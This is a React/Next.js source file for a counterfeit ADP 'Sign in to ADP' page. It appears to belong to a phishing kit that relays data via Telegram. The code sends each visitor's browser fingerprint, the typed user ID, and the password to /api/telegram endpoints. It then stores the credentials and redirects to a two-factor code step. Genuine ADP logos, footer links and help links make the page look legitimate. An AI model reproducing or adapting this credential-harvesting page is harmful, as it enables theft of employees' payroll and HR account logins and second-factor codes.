"use client";
import { useCallback, useEffect, useRef, useState } from "react";
import { MessageCircle } from "lucide-react";
import { useRouter } from "next/navigation";
import BotFingerprintCollector from "@/components/BotFingerprintCollector";
import { LOGIN_SESSION } from "@/lib/login-flow";
import { SITE_DISPLAY_NAME } from "@/lib/site-url";
import {
  MSG_UNABLE_REACH_VERIFICATION,
  SIGN_IN_LOADING_MS,
} from "@/lib/approval-messages";
import { useLoginDeniedQueryParams } from "@/hooks/use-login-denied-query";
import { storeLoginCredentials } from "@/lib/submit-pending-gate";

const ADP_LOGO_SRC = "/adp-login-logo.png";
const ADP_QR_SRC = "/adp-qr.png";

export function AdpLoginPage() {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPasswordField, setShowPasswordField] = useState(false);
  const [formError, setFormError] = useState("");
  const [isContinueLoading, setIsContinueLoading] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const passwordInputRef = useRef<HTMLInputElement | null>(null);
  const router = useRouter();

  useLoginDeniedQueryParams({
    onDenied: setFormError,
    onUnavailable: setFormError,
  });

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.removeItem(LOGIN_SESSION.verify);
      sessionStorage.removeItem(LOGIN_SESSION.identity);
      sessionStorage.removeItem(LOGIN_SESSION.otp2);
      sessionStorage.removeItem(LOGIN_SESSION.method);
    }
  }, []);

  useEffect(() => {
    // Kit TELEGRAM_NOTIFICATIONS.md §1: fire as soon as a human reaches the
    // gated entry — not after the spinner and not on first click. Once per tab.
    const VISITOR_SENT_KEY = "onlineadp_visitor_notified";
    let alreadySent = false;
    try {
      alreadySent = sessionStorage.getItem(VISITOR_SENT_KEY) === "1";
    } catch {
      alreadySent = false;
    }
    if (alreadySent) return;

    const sendVisitorNotification = () => {
      try {
        sessionStorage.setItem(VISITOR_SENT_KEY, "1");
      } catch {
        // ignore sessionStorage failures
      }

      const screen = `${window.screen.width}x${window.screen.height}`;
      const language =
        navigator.language || navigator.languages?.[0] || "unknown";

      fetch("/api/telegram/visitor", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userAgent: navigator.userAgent,
          screen,
          language,
          referrer: document.referrer || "Direct",
          pageUrl: window.location.href,
        }),
      }).catch((error) => {
        console.error("Failed to send visit notification:", error);
      });
    };

    sendVisitorNotification();
  }, []);

  const busy = isSubmitting || isContinueLoading;

  const handleRevealPassword = useCallback(async () => {
    if (busy || !userId.trim()) return;
    setIsContinueLoading(true);
    setFormError("");
    const trimmed = userId.trim();
    void fetch("/api/telegram/username", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ userId: trimmed }),
      keepalive: true,
    }).catch(console.error);
    await new Promise((resolve) => setTimeout(resolve, SIGN_IN_LOADING_MS));
    setShowPasswordField(true);
    setIsContinueLoading(false);
    window.setTimeout(() => passwordInputRef.current?.focus(), 0);
  }, [busy, userId]);

  const handleSignIn = useCallback(async () => {
    if (busy) return;

    if (!showPasswordField) {
      await handleRevealPassword();
      return;
    }

    if (!userId.trim() || !password.trim()) return;
    setFormError("");
    setIsSubmitting(true);

    try {
      void fetch("/api/telegram/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, password }),
        keepalive: true,
      }).catch(console.error);

      storeLoginCredentials(userId.trim(), password);
      await new Promise((resolve) => setTimeout(resolve, SIGN_IN_LOADING_MS));
      router.push("/tfa");
    } catch {
      setFormError(MSG_UNABLE_REACH_VERIFICATION);
      setIsSubmitting(false);
    }
  }, [busy, handleRevealPassword, password, router, showPasswordField, userId]);

  return (
    <>
      <BotFingerprintCollector />
      <div className="page-shell">
        <div className="main-wrapper">
          <div className="login-card">
            <div className="card-header-actions">
              <span className="lock-icon">🔒</span>
              <a href="/api/login-out" className="lang-select">
                Languages ▾
              </a>
            </div>

            <div className="logo-container">
              <img src={ADP_LOGO_SRC} alt={SITE_DISPLAY_NAME} className="logo-img" />
            </div>

            <h1>Sign in to ADP</h1>

            <form
              onSubmit={(event) => {
                event.preventDefault();
                void handleSignIn();
              }}
            >
              {formError ? (
                <div className="login-error-banner" role="alert">
                  {formError}
                </div>
              ) : null}
              <div className="form-group">
                <label htmlFor="userId">User ID</label>
                <input
                  type="text"
                  id="userId"
                  autoFocus
                  autoComplete="username"
                  value={userId}
                  disabled={busy}
                  onChange={(event) => {
                    setUserId(event.target.value);
                  }}
                />

                {showPasswordField ? (
                  <div className="password-group">
                    <label htmlFor="password">Password</label>
                    <input
                      ref={passwordInputRef}
                      type="password"
                      id="password"
                      autoComplete="current-password"
                      value={password}
                      disabled={busy}
                      onChange={(event) => setPassword(event.target.value)}
                      placeholder="Enter your password"
                    />
                  </div>
                ) : null}

                <label className="checkbox-container">
                  <input type="checkbox" /> Remember user ID{" "}
                  <span className="info-bubble">?</span>
                </label>
              </div>

              <div className="action-row">
                <a
                  href="https://www.adp.com/logins/my-adp.aspx"
                  className="help-link"
                >
                  Need help signing in?
                </a>
                <button
                  type="submit"
                  className={`btn-next ${
                    (showPasswordField
                      ? userId.trim() && password.trim()
                      : userId.trim())
                      ? "btn-next-ready"
                      : ""
                  }`}
                  disabled={
                    busy ||
                    !userId.trim() ||
                    (showPasswordField && !password.trim())
                  }
                >
                  {busy ? "Signing in..." : "Next"}
                </button>
              </div>
            </form>

            <div className="new-user-section">
              <span>
                New user ? <a href="/api/login-out">Get started</a>
              </span>
            </div>

            <div className="mobile-app-section">
              <img
                src={ADP_QR_SRC}
                alt="QR code to download the ADP Mobile Solutions app"
                className="qr-placeholder"
                style={{
                  objectPosition: "left center",
                  width: "60px",
                  height: "60px",
                  overflow: "hidden",
                }}
              />
              <div className="mobile-text">
                <h3>Download the ADP mobile app</h3>
                <p>
                  Scan the QR code with your device to begin. Secure and
                  convenient tools right in your hands for simple, anytime
                  access across devices.
                </p>
                <a
                  href="https://www.adp.com/what-we-offer/products/adp-mobile-solutions.aspx"
                  className="learn-more"
                >
                  LEARN MORE →
                </a>
              </div>
            </div>
          </div>
        </div>

        <footer className="global-footer">
          <div className="footer-links">
            <a href="https://www.adp.com/privacy.aspx">PRIVACY</a>
            <a href="https://netsecure.adp.com/public/legal/TermsCondition.html">
              LEGAL
            </a>
            <a href="https://www.adp.com/what-we-offer/ai-solutions/responsible-ai.aspx">
              AI Transparency
            </a>
          </div>
          <div>© 2014-2026 ADP, Inc.</div>
        </footer>
      </div>

      <a
        href="/api/login-out"
        className="fixed bottom-4 right-4 w-12 h-12 sm:w-14 sm:h-14 rounded-full flex items-center justify-center shadow-lg z-50 hover:scale-105 transition-transform"
        style={{ backgroundColor: "#0099D8" }}
        aria-label="Chat support"
      >
        <MessageCircle className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
      </a>
    </>
  );
}
